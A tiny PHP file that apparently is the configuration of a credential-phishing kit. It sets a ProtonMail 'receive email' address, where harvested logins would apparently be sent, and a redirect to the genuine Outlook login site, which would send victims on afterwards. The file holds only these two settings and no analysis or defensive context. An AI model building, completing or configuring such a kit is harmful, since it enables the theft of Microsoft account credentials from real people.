<?php 
$Receive_email="dansmith656os@protonmail.com";
$redirect="https://outlook.live.com/";
?>